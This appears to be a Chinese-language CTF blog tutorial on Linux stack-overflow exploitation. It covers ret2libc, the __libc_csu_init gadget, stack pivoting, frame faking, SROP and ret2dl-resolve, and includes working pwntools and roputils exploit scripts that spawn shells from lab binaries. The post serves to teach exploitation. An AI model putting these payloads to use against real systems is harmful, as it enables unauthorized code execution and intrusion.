Title: How2Stack
Date: 2018-04-05 09:00:17.387858
Modified: 2018-04-05 09:00:17.387858
Category: stack
Tags: stack,linux
Slug: how2stack
Authors: Alset0326
Summary: How to stack

[TOC]

尝试顺序

ret2text(system,'/bin/sh')->ret2syscall->ret2libc

# 0.0 Return 2 libc

ret2libc即控制流程使得执行 libc中的函数，通常是ret至某个函数的plt处或者函数的具体位置(即libc中的位置，可由got表泄露并计算)。

一般情况下，我们会选择执行system("/bin/sh")，故而此时我们需要知道system函数的地址。

**通常我们ret至plt来调用需要的导入函数（例如puts和gets），这里需要注意函数调用栈的结构，plt的代码通常是使用call跳过来的，因此ret返回到的plt中时，相当于已经执行了call，这时栈顶应该是一个返回地址，参数（rdi、rsi、rdx…）已经被填好，（如果是x86，返回地址后是对应的参数内容，因此栈顶的返回地址需要指向pop的gadget）。**

## 使用`puts/write`函数泄露数据

当原二进制中没有system时，一般需要泄露libc基址，通常会ret至plt['puts']，使用`puts`函数泄露相关信息，这里需要将参数（rdi、rsi、rdx…）事先填好。

这里介绍一个二次触发漏洞的技巧，一般流程，代码为x86：

- 泄露__libc_start_main地址，因为该地址肯定初始化了
- 获取libc版本
- 获取system地址与/bin/sh的地址
- **再次执行源程序**
- 触发栈溢出执行system(‘/bin/sh’)

```python
##!/usr/bin/env python
from pwn import *
from LibcSearcher import LibcSearcher
sh = process('./ret2libc3')

ret2libc3 = ELF('./ret2libc3')

puts_plt = ret2libc3.plt['puts']
libc_start_main_got = ret2libc3.got['__libc_start_main']
main = ret2libc3.symbols['main']

print "leak libc_start_main_got addr and return to main again"
payload = flat(['A' * 112, puts_plt, main, libc_start_main_got])
sh.sendlineafter('Can you find it !?', payload)

print "get the related addr"
libc_start_main_addr = u32(sh.recv()[0:4])
libc = LibcSearcher('__libc_start_main', libc_start_main_addr)
libcbase = libc_start_main_addr - libc.dump('__libc_start_main')
system_addr = libcbase + libc.dump('system')
binsh_addr = libcbase + libc.dump('str_bin_sh')

print "get shell"
payload = flat(['A' * 104, system_addr, 0xdeadbeef, binsh_addr])
sh.sendline(payload)

sh.interactive()
```

## 使用`gets/read`函数写入数据

当需要写入数据时，可以使用`gets`函数，这里仍然需要注意将参数（rdi、rsi、rdx…）事先填好。

# 0.1 Return 2 Syscall

一般会期望执行

```c
execve("/bin/sh", NULL, NULL)
```

**需要注意的是，在x64架构上，`int 80h`指令依然是使用x86的调用规范，而`syscall`指令才是执行x64调用规范**

这里，x64需要使得

- 系统调用号即rax应该为0x3b
- 第一个参数即rdi应该指向/bin/sh的地址，其实执行sh的地址也可以
- 第二个参数即rsi应该为0
- 第三个参数erdx应该为0

x86需要使得

- 系统调用号即eax应该为0xb
- 第一个参数即ebx应该指向/bin/sh的地址，其实执行sh的地址也可以
- 第二个参数即ecx应该为0
- 第三个参数edx应该为0

搜索可使用

```sh
ROPgadget --binary rop --nojop --nosys --only 'pop|ret' |grep eax
```

# 1. ret2__libc_scu_init / 万能gadget

**原理**

在64位程序中，函数的前6个参数是通过寄存器传递的，但是大多数时候，我们很难找到每一个寄存器对应的gadgets。 这时候，我们可以利用x64下的__libc_scu_init中的gadgets。这个函数是用来对libc进行初始化操作的，而一般的程序都会调用libc函数，所以这个函数一定会存在。我们先来看一下这个函数(当然，不同版本的这个函数有一定的区别)

```
.text:00000000004005C0 ; void _libc_csu_init(void)
.text:00000000004005C0                 public __libc_csu_init
.text:00000000004005C0 __libc_csu_init proc near               ; DATA XREF: _start+16o
.text:00000000004005C0                 push    r15
.text:00000000004005C2                 push    r14
.text:00000000004005C4                 mov     r15d, edi
.text:00000000004005C7                 push    r13
.text:00000000004005C9                 push    r12
.text:00000000004005CB                 lea     r12, __frame_dummy_init_array_entry
.text:00000000004005D2                 push    rbp
.text:00000000004005D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry
.text:00000000004005DA                 push    rbx
.text:00000000004005DB                 mov     r14, rsi
.text:00000000004005DE                 mov     r13, rdx
.text:00000000004005E1                 sub     rbp, r12
.text:00000000004005E4                 sub     rsp, 8
.text:00000000004005E8                 sar     rbp, 3
.text:00000000004005EC                 call    _init_proc
.text:00000000004005F1                 test    rbp, rbp
.text:00000000004005F4                 jz      short loc_400616
.text:00000000004005F6                 xor     ebx, ebx
.text:00000000004005F8                 nop     dword ptr [rax+rax+00000000h]
.text:0000000000400600
.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54j
.text:0000000000400600                 mov     rdx, r13
.text:0000000000400603                 mov     rsi, r14
.text:0000000000400606                 mov     edi, r15d
.text:0000000000400609                 call    qword ptr [r12+rbx*8]
.text:000000000040060D                 add     rbx, 1
.text:0000000000400611                 cmp     rbx, rbp
.text:0000000000400614                 jnz     short loc_400600
.text:0000000000400616
.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34j
.text:0000000000400616                 add     rsp, 8
.text:000000000040061A                 pop     rbx
.text:000000000040061B                 pop     rbp
.text:000000000040061C                 pop     r12
.text:000000000040061E                 pop     r13
.text:0000000000400620                 pop     r14
.text:0000000000400622                 pop     r15
.text:0000000000400624                 retn
.text:0000000000400624 __libc_csu_init endp
```

这里我们可以利用以下几点

- 从0x000000000040061A一直到结尾，我们可以利用栈溢出构造栈上数据来控制rbx,rbp,r12,r13,r14,r15寄存器的数据。
- 从0x0000000000400600到0x0000000000400609，我们可以将r13赋给rdx,将r14赋给rsi，将r15d赋给edi（需要注意的是，虽然这里赋给的是edi，**但其实此时rdi的高32位寄存器值为0（自行调试）**，所以其实我们可以控制rdi寄存器的值，只不过只能控制低32位），而这三个寄存器，也是x64函数调用中传递的前三个寄存器。此外，如果我们可以合理地控制r12与rbx，那么我们就可以调用我们想要调用的函数。比如说我们可以控制rbx为0，r12为存储我们想要调用的函数的地址。
- 从0x000000000040060D到0x0000000000400614，我们可以控制rbx与rbp的之间的关系为rbx+1=rbp，这样我们就不会执行loc_400600，进而可以继续执行下面的汇编程序。这里我们可以简单的设置rbx=0，rbp=1。

***模板***

```python
def csu(got_func, got_func_arg3, got_func_arg2, got_func_arg1, ret):
    # pop rbx,rbp,r12,r13,r14,r15; ret
    csu_end_addr = 0x000000000040061A
    # mov     rdx, r13
    # mov     rsi, r14
    # mov     edi, r15d
    # call    qword ptr [r12+rbx*8]
    # add     rbx, 1
    # cmp     rbx, rbp
    # jnz     short loc_400600
    # add     rsp, 8
    # pop rbx,rbp,r12,r13,r14,r15
    # retn
    csu_front_addr = 0x0000000000400600
    # rbx should be 0,
    # rbp should be 1,enable not to jump
    # r12 should be the function we want to call
    # rdi=edi=r15d
    # rsi=r14
    # rdx=r13
    rbx = 0
    rbp = rbx + 1
    r12 = got_func
    r15 = got_func_arg1
    r14 = got_func_arg2
    r13 = got_func_arg3

    payload = ''
    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += 'a' * 0x38 # 8pad, rbx,rbp,r12,r13,r14,r15
    payload += p64(ret)
    return payload
```

通过反复ret至存在溢出的函数，一般的使用方法为

```c
write(1,write_got,8); // 获得 write的got表地址
read(0,bss_base,16); // bss段写入 execve_addr + '/bin/sh\x00'
execve(bss_base+8); //	执行
```

***改进***

在上面的时候，我们直接利用了这个通用gadgets，其输入的字节长度为128。但是，并不是所有的程序漏洞都可以让我们输入这么长的字节。那么当允许我们输入的字节数较少的时候，我们该怎么有什么办法呢？下面给出了几个方法

0.改进1-提前控制RBX与RBP

可以看到在我们之前的利用中，我们利用这两个寄存器的值的主要是为了满足cmp的条件，并进行跳转。如果我们可以提前控制这两个数值，那么我们就可以减少16字节，即我们所需的字节数只需要112。

1.改进2-多次利用

其实，改进1也算是一种多次利用。我们可以看到我们的gadgets是分为两部分的，那么我们其实可以进行两次调用来达到的目的，以便于减少一次gadgets所需要的字节数。但这里的多次利用需要更加严格的条件

- 漏洞可以被多次触发
- 在两次触发之间，程序尚未修改r12-r15寄存器，这是因为要两次调用。

**当然，有时候我们也会遇到一次性可以读入大量的字节，但是不允许漏洞再次利用的情况，这时候就需要我们一次性将所有的字节布置好，之后慢慢利用。**

**gadget**

其实，除了上述这个gadgets，gcc默认还会编译进去一些其它的函数

```
_init
_start
call_gmon_start
deregister_tm_clones
register_tm_clones
__do_global_dtors_aux
frame_dummy
__libc_csu_init
__libc_csu_fini
_fini
```

我们也可以尝试利用其中的一些代码来进行执行。此外，由于PC本身只是将程序的执行地址处的数据传递给CPU，而CPU则只是对传递来的数据进行解码，只要解码成功，就会进行执行。所以我们可以将源程序中一些地址进行偏移从而来获取我们所想要的指令，只要可以确保程序不崩溃。

需要一说的是，在上面的libc_csu_init中我们主要利用了以下寄存器

- 利用尾部代码控制了rbx，rbp，r12，r13，r14，r15。
- 利用中间部分的代码控制了rdx，rsi，edi。

而其实libc_csu_init的尾部通过偏移是可以控制其他寄存器的。其中，0x000000000040061A是正常的起始地址，**可以看到我们在0x000000000040061f处可以控制rbp寄存器，在0x0000000000400621处可以控制rsi寄存器。**而如果想要深入地了解这一部分的内容，就要对汇编指令中的每个字段进行更加透彻地理解。如下。

```
gef➤  x/5i 0x000000000040061A
   0x40061a <__libc_csu_init+90>:   pop    rbx
   0x40061b <__libc_csu_init+91>:   pop    rbp
   0x40061c <__libc_csu_init+92>:   pop    r12
   0x40061e <__libc_csu_init+94>:   pop    r13
   0x400620 <__libc_csu_init+96>:   pop    r14
gef➤  x/5i 0x000000000040061b
   0x40061b <__libc_csu_init+91>:   pop    rbp
   0x40061c <__libc_csu_init+92>:   pop    r12
   0x40061e <__libc_csu_init+94>:   pop    r13
   0x400620 <__libc_csu_init+96>:   pop    r14
   0x400622 <__libc_csu_init+98>:   pop    r15
gef➤  x/5i 0x000000000040061A+3
   0x40061d <__libc_csu_init+93>:   pop    rsp
   0x40061e <__libc_csu_init+94>:   pop    r13
   0x400620 <__libc_csu_init+96>:   pop    r14
   0x400622 <__libc_csu_init+98>:   pop    r15
   0x400624 <__libc_csu_init+100>:  ret 
gef➤  x/5i 0x000000000040061e
   0x40061e <__libc_csu_init+94>:   pop    r13
   0x400620 <__libc_csu_init+96>:   pop    r14
   0x400622 <__libc_csu_init+98>:   pop    r15
   0x400624 <__libc_csu_init+100>:  ret    
   0x400625:    nop
gef➤  x/5i 0x000000000040061f
   0x40061f <__libc_csu_init+95>:   pop    rbp
   0x400620 <__libc_csu_init+96>:   pop    r14
   0x400622 <__libc_csu_init+98>:   pop    r15
   0x400624 <__libc_csu_init+100>:  ret    
   0x400625:    nop
gef➤  x/5i 0x0000000000400620
   0x400620 <__libc_csu_init+96>:   pop    r14
   0x400622 <__libc_csu_init+98>:   pop    r15
   0x400624 <__libc_csu_init+100>:  ret    
   0x400625:    nop
   0x400626:    nop    WORD PTR cs:[rax+rax*1+0x0]
gef➤  x/5i 0x0000000000400621
   0x400621 <__libc_csu_init+97>:   pop    rsi
   0x400622 <__libc_csu_init+98>:   pop    r15
   0x400624 <__libc_csu_init+100>:  ret    
   0x400625:    nop
gef➤  x/5i 0x000000000040061A+9
   0x400623 <__libc_csu_init+99>:   pop    rdi
   0x400624 <__libc_csu_init+100>:  ret    
   0x400625:    nop
   0x400626:    nop    WORD PTR cs:[rax+rax*1+0x0]
   0x400630 <__libc_csu_fini>:  repz ret 
```

# 2. stack privot

***原理***

stack privot，正如它所描述的，该技巧就是劫持栈指针指向攻击者所能控制的内存处，然后再在相应的位置进行ROP。一般来说，我们可能在以下情况需要使用stack privot

- 可以控制的栈溢出的字节数较少，难以构造较长的ROP链
- 开启了PIE保护，栈地址未知，我们可以将栈劫持到已知的区域。
- 其它漏洞难以利用，我们需要进行转换，比如说将栈劫持到堆空间，从而利用堆漏洞

此外，利用stack privot有以下几个要求

- 可以控制程序执行流。
- 可以控制sp指针。一般来说，控制栈指针会使用ROP，常见的控制栈指针的gadgets一般是

```
pop rsp/esp
```

当然，还会有一些其它的姿势。比如说libc_csu_init中的gadgets，我们通过偏移就可以得到控制rsp指针。上面的是正常的，下面的是偏移的。

```
gef➤  x/7i 0x000000000040061a
0x40061a <__libc_csu_init+90>:  pop    rbx
0x40061b <__libc_csu_init+91>:  pop    rbp
0x40061c <__libc_csu_init+92>:  pop    r12
0x40061e <__libc_csu_init+94>:  pop    r13
0x400620 <__libc_csu_init+96>:  pop    r14
0x400622 <__libc_csu_init+98>:  pop    r15
0x400624 <__libc_csu_init+100>: ret    
gef➤  x/7i 0x000000000040061d
0x40061d <__libc_csu_init+93>:  pop    rsp
0x40061e <__libc_csu_init+94>:  pop    r13
0x400620 <__libc_csu_init+96>:  pop    r14
0x400622 <__libc_csu_init+98>:  pop    r15
0x400624 <__libc_csu_init+100>: ret
```

此外，还有更加高级的fake frame。

- 存在可以控制内容的内存，一般有如下
- bss段。由于进程按页分配内存，分配给bss段的内存大小至少一个页(4k,0x1000)大小。然而一般bss段的内容用不了这么多的空间，并且bss段分配的内存页拥有读写权限。
- heap。但是这个需要我们能够泄露堆地址。

此外，如果能够溢出的字节较少，那么可以通过“抬栈”操作，例如`jmp esp`之后，可以再`sub esp; jmp esp`，使得能够执行之前的shellcode

# 3. frame faking / double leave

正如这个技巧名字所说的那样，这个技巧就是构造一个虚假的栈帧来控制程序的执行流。

使用`leave`指令修改esp

***原理***

概括地讲，我们在之前讲的栈溢出不外乎两种方式

- 控制程序EIP
- 控制程序EBP

其最终都是控制程序的执行流。在frame faking中，我们所利用的技巧便是同时控制EBP与EIP，这样我们在控制程序执行流的同时，也改变程序栈帧的位置。一般来说其payload如下

```
buffer padding|fake ebp|leave ret addr|
```

即我们利用栈溢出将栈上构造为如上格式。这里我们主要接下后面两个部分

- 函数的返回地址被我们覆盖为执行leave ret的地址，这就表明了函数在正常执行完自己的leave ret后，还会再次执行一次leave ret。
- 其中fake ebp为我们构造的栈帧的基地址，需要注意的是这里是一个地址。一般来说我们构造的假的栈帧如下

```
fake ebp
|
v
ebp2|target function addr|leave ret addr|arg1|arg2
```

这里我们的fake ebp指向ebp2，即它为ebp2所在的地址。通常来说，这里都是我们能够控制的可读的内容。

在我们介绍基本的控制过程之前，我们还是有必要说一下，函数的入口点与出口点的基本操作

入口点

```
push ebp  # 将ebp压栈
mov ebp, esp #将esp的值赋给ebp
```

出口点

```
leave
ret #pop eip，弹出栈顶元素作为程序下一个执行地址
```

其中leave指令相当于

```
mov esp, ebp # 将ebp的值赋给esp
pop ebp #弹出ebp
```

下面我们来仔细说一下基本的控制过程。

1. 在有栈溢出的程序执行`leave`时，其分为两个步骤
2. `mov esp, ebp` ，这会将esp也指向当前栈溢出漏洞的ebp基地址处。
3. `pop ebp`， 这会将栈中存放的fake ebp的值赋给ebp。即执行完指令之后，ebp便指向了ebp2，也就是保存了ebp2所在的地址。
4. 执行`ret`指令，会再次执行leave ret指令。
5. 执行`leave`指令，其分为两个步骤
6. `mov esp, ebp` ，这会将esp指向ebp2。
7. `pop ebp`，此时，会将ebp的内容设置为ebp2的值，同时esp会指向target function。
8. 执行`ret`指令，这时候程序就会执行target function，当其进行程序的时候会执行
9. `push ebp`,会将ebp2值压入栈中，
10. `mov ebp, esp`，将ebp指向当前基地址。

此时的栈结构如下

```
ebp
|
v
ebp2|leave ret addr|arg1|arg2
```

1. 当程序执行时，其会正常申请空间，同时我们在栈上也安排了该函数对应的参数，所以程序会正常执行。
2. 程序结束后，其又会执行两次 leave ret addr，所以如果我们在ebp2处布置好了对应的内容，那么我们就可以一直控制程序的执行流程。

可以看出在fake frame中，我们有一个需求就是，我们必须得有一块可以写的内存，并且我们还知道这块内存的地址，这一点与stack privot相似。

# 4. SROP

```asm
extra knowledge：
    syscall: sigreturn
    /*for x86*/
    mov eax,0x77
    int 80h
    /*for x86_64*/
    mov rax,0xf
syscall
    signal handler
```

首先，当由中断或异常产生时，会发出一个信号，然后会送给相关进程，此时系统切换到内核模式。再次返回到用户模式前，内核会执行do_signal()函数，最终会调用setup_frame()函数来设置用户栈。setup_frame函数主要工作是往用户栈中push一个保存有全部寄存器的值和其它重要信息的数据结构(各架构各不相同)，另外还会push一个signal function的返回地址——sigruturn()系统调用的地址。

当这些准备工作完成后，就开始执行由用户指定的signal function了。当执行完后，因为返回地址被设置为sigreturn()系统调用的地址了，所以此时系统又会陷入内核执行sigreturn()系统调用。此系统调用的主要工作是用原先push到栈中的内容来恢复寄存器的值和相关内容。当系统调用结束后，程序恢复执行。

***Exploit***

伪造sigcontext结构，push到栈中。伪造过程中需要将eax，ebx，ecx等参数寄存器设置为相关值，eip设置为syscall的地址。并且需要注意的是esp，ebp和es，gs等段寄存器不可直接设置为0，经过个人测试，这样不会成功。

然后将返回地址设置为sigreturn的地址(或者相关gadget)。

最后当sigreturn系统调用执行完后，就直接执行你的系统调用了

***Point***

利用过程比较麻烦的一点是找sigreturn的地址(或gadget)。对于x86来说，vdso(vitualdynamic sharedobject)会有sigreturn的地址，而且vdso的地址可以很容易爆破得到。因为即使对开了ASLR的linux来说，其地址也只有一个字节是随机的。

```
gdb-peda$x/3i 0xf7fdb411
	0xf7fdb411<__kernel_sigreturn+1>:   mov    eax,0x77
	0xf7fdb416<__kernel_sigreturn+6>:   int    0x80
	0xf7fdb418<__kernel_sigreturn+8>:   nop
```

但是对x64来说，爆破vdso就比较难了。原来只有11bit是随记的，但我在我的linux上测试好像有22位是随机的了，爆破也就几小时而已(个人亲测)，还是能爆出来的。关于64位的爆破，可参考Return to VDSO using ELF Auxiliary Vectors。

***Example***

```c
#include <stdio.h>
#include <unistd.h>
char buf[10] = "/bin/sh\x00";
int main()
{
    char s[0x100];
    puts("input something you want: ");
    read(0, s, 0x400);
    return 0;
}
```

***Exp***

```python
from pwn import *
import random

binsh_addr = 0x804a024
bss_addr = 0x804a02e
vdso_range = range(0xf7700000, 0xf7800000, 0x1000)

def main():
    global p
    debug = 1
    if debug:
        #context.level_log = "debug"
        context.arch = "i386"
        p = process('./srop_test')
    else:
        pass
    
    global vdso_addr
    vdso_addr = random.choice(vdso_range)
    payload = 'a' * 0x10c
    frame = SigreturnFrame(kernel = "i386")
    frame.eax = 0xb
    frame.ebx = binsh_addr
    frame.ecx = 0
    frame.edx = 0
    frame.eip = vdso_addr + 0x416  #address of int 80h
    frame.esp = bss_addr # whatever
    frame.ebp = bss_addr # whatever
    frame.gs = 0x63
    frame.cs = 0x23
    frame.es = 0x2b
    frame.ds = 0x2b
    frame.ss = 0x2b
    
    ret_addr = vdso_addr + 0x411  #address of sigreturn syscall
    
    #print payload
    
    payload += p32(ret_addr) + str(frame)
    p.recvuntil("input something you want: \n")
    p.sendline(payload)

    sleep(1)
    p.sendline("echo pwned!")
    r = p.recvuntil("pwned!")
    if r != "pwned!":
        raise Exception("Failed!")

    return

    

if __name__ == "__main__":
    global p, vdso_addr
    i = 1
    while True:
        print "\nTry %d" % i
        try:
            main()
        except:
            #print e
            p.close()
            i += 1
            continue
        print "vdso_addr: " + hex(vdso_addr)
        p.interactive()
        break
```



# 5. FSPO

File-Stream-Pointer-Overflow，适合存在FILE*指针的情况

#  6. Stack smash / Using abort message

在程序加了canary保护之后，如果我们读取的buffer覆盖了对应的值时，程序就会报错，而一般来说我们并不会关心报错信息。而stack smash技巧则就是利用打印这一信息的程序来得到我们想要的内容。这是因为在程序发现canary保护之后，如果发现canary被修改的话，程序就会执行__stack_chk_fail函数来打印argv[0]指针所指向的字符串，正常情况下，这个指针指向了程序名。其代码如下

```c
void __attribute__ ((noreturn)) __stack_chk_fail (void)
{
  __fortify_fail ("stack smashing detected");
}
void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)
{
  /* The loop is added only to keep gcc happy.  */
  while (1)
    __libc_message (2, "*** %s ***: %s terminated\n",
                    msg, __libc_argv[0] ?: "<unknown>");
}
```

所以说如果我们利用栈溢出覆盖argv[0]为我们想要输出的字符串的地址，那么在__fortify_fail函数中就会输出我们想要的信息。

#  7. return 2 dl-resolve

returnto dl-resolve利用的就是函数的lazybinding。在此过程中会调用_dl_runtime_roslve函数，然后这个函数会调用fixup()函数来获得函数的地址，并把地址写入相应reloc的r_offset字段(GOT),然后执行解析的函数

*注：dl-resolve函数其实跟fixup函数实现的是相同的功能，只是在不同glibc中名字不同而已*

跳转到对应的plt项

```
(gdb) x/4i 0x80483f0
   0x80483f0 <write@plt>:	    jmp    *0x804a020
   0x80483f6 <write@plt+6>:	    push   $0x28
   0x80483fb <write@plt+11>:	    jmp    0x8048390
```

然后跳转都相应got项。当然第一次调用时其got表项存放的是相应plt表项的第二条指令的地址。其实又回到了plt表项。

再把相应偏移量push后，然后跳转到PLT[0]，就是上面的第三条指令。第一次push GOT[1]，一个指向link_map结构体的指针，然后跳转到GOT[2]里面存放的地址,即`_dl_runtime_resolve`函数的地址。然后此函数会把解析得到的函数地址写入reloc项的r_offset字段。最后在`_dl_runtime_resolve`返回后跳到了相应的函数体执行。

PLT[0]存放的内容如下：

```
(gdb) x/2i 0x8048390
   0x8048390:	pushl  0x804a004
   0x8048396:	jmp    *0x804a008
```

其实就是函数参数先压栈，然后执行了_dl_runtime_resolve(*link_map, rel_offset)函数。

要详细理解这种利用方式，必须对elf文件格式有所了解。

具体_dl_runtime_resolve函数的具体执行过程如下：

1. 计算函数的relocentry。

   Elf32_Rel* reloc = JMPREL + reloc_offset;

2. 计算函数的symtabentry。

   Elf32_Sym* sym = &SYMTAB[ ELF32_R_SYM (reloc->r_info) ];

3. securitycheck

   assert(ELF32_R_TYPE(reloc->r_info) == R_386_JMP_SLOT);

4. 计算函数名称在dynstr表中的偏移。

   name= STRTAB + sym->st_name;

5. 函数地址写入相应的项，堆栈调整，执行函数

***Exploit*** 怎么利用？

1. 控制EIP为PLT[0]的地址，只需传递一个index_arg参数
2. 控制index_arg的大小，使reloc的位置落在可控地址内
3. 伪造reloc的内容，使sym落在可控地址内
4. 伪造sym的内容，使name落在可控地址内
5. 伪造name为任意库函数，如system

64位比32位有了些许变化。相关的结构体大小不同，函数参数也变成由寄存器传递而非栈传递。需要注意的是64位还需要泄露link_map的值，目的是将link_map+0x1c8处设为NULL，这样才能绕过相关检测

使用`roputils`

```python
from roputils import *
from pwn import process
from pwn import gdb
from pwn import context
r = process('./main')
context.log_level = 'debug'
r.recv()

rop = ROP('./main')
offset = 112
bss_base = rop.section('.bss')
buf = rop.fill(offset)

buf += rop.call('read', 0, bss_base, 100)
## used to call dl_Resolve()
buf += rop.dl_resolve_call(bss_base + 20, bss_base)
r.send(buf)

buf = rop.string('/bin/sh')
buf += rop.fill(20, buf)
## used to make faking data, such relocation, Symbol, Str
buf += rop.dl_resolve_data(bss_base + 20, 'system')
buf += rop.fill(100, buf)
r.send(buf)
r.interactive()
```



# # 技巧

## 0. One_gadget

> https://github.com/david942j/one_gadget

## 1. 固定地址的syscall

sycall指令位于 `read_addr + 0xe`

在x86_64架构上该偏移`0xe`很固定

x86上的也有类似

## 2. Leaking canary byte-by-byte

逐个字节泄露canary，该技术适用于fork出的进程，canary固定，可使用溢出技术逐个爆破canary，若错误则会退出，若正确则不退出

## 3. 反复触发漏洞函数

有时候存在栈溢出的函数默认逻辑只能被调用一次，若需要多次调用，可将栈上的返回地址再度覆盖为有漏洞的函数，使得漏洞函数能够多次调用，获取必要信息。也可覆盖`fini_array`的有关地址，再次强制进入漏洞函数。

## 4. shell获取小结

这里总结几种常见的获取shell的方式：

- 执行shellcode，这一方面也会有不同的情况
  - 可以直接返回shell
  - 可以将shell返回到某一个端口
  - shellcode中字符有时候需要满足不同的需求
  - **注意，我们需要将shellcode写在可以执行的内存区域中。**
- 执行 system("/bin/sh"), system('sh') 等等
  - 关于 system 的地址，参见下面章节的**地址寻找**。
  - 关于 "/bin/sh"， “sh”
    - 首先寻找 binary 里面有没有对应的字符串，**比如说有 flush 函数，那就一定有 sh 了**
    - 考虑个人读取对应字符串
    - libc 中其实是有 /bin/sh 的
  - 优点
    - 只需要一个参数。
  - 缺点
    - **有可能因为破坏环境变量而无法执行。**
- 执行 execve("/bin/sh",NULL,NULL)
  - 前几条同 system
  - 优点
    - 几乎不受环境变量的影响。
  - 缺点
    - **需要 3 个参数。**
- 系统调用
  - 系统调用号 11

## 5. 地址寻找小结

在整个漏洞利用过程中，我们总是免不了要去寻找一些地址，常见的寻找地址的类型，有如下几种

### 通用寻找

#### 直接地址寻找

程序中已经给出了相关变量或者函数的地址了。这时候，我们就可以直接进行利用了。

#### got表寻找

有时候我们并不一定非得直接知道某个函数的地址，可以利用GOT表的跳转到对应函数的地址。当然，如果我们非得知道这个函数的地址，我们可以利用write，puts等输出函数将GOT表中地址处对应的内容输出出来（**前提是这个函数已经被解析一次了**）。

### 有libc

**相对偏移寻找**，这时候我们就需要考虑利用libc中函数的基地址一样这个特性来寻找了。其实__libc_start_main就是libc在内存中的基地址。**注意：不要选择有wapper的函数，这样会使得函数的基地址计算不正确。**常见的有wapper的函数有（待补充）。

### 无libc

其实，这种情况的解决策略分为两种

- 想办法获取libc
- 想办法直接获取对应的地址。

而对于想要泄露的地址，我们只是单纯地需要其对应的内容，所以puts和write均可以。

- puts会有\x00截断的问题
- write可以指定长度输出的内容。

下面是一些相应的方法

#### DynELF

前提是我们可以泄露任意地址的内容。

- **如果要使用write函数泄露的话，一次最好多输出一些地址的内容，因为我们一般是只是不断地向高地址读内容，很有可能导致高地址的环境变量被覆盖，就会导致shell不能启动。**

#### libc数据库

```
## 更新数据库
./get
## 将已有libc添加到数据库中
./add libc.so 
## Find all the libc's in the database that have the given names at the given addresses. 
./find function1 addr function2 addr
## Dump some useful offsets, given a libc ID. You can also provide your own names to dump.
./Dump some useful offsets
```

去libc的数据库中找到对应的和已经出现的地址一样的libc，这时候很有可能是一样的。

- libcdb.com

**当然，还有上面提到的https://github.com/lieanu/LibcSearcher。**

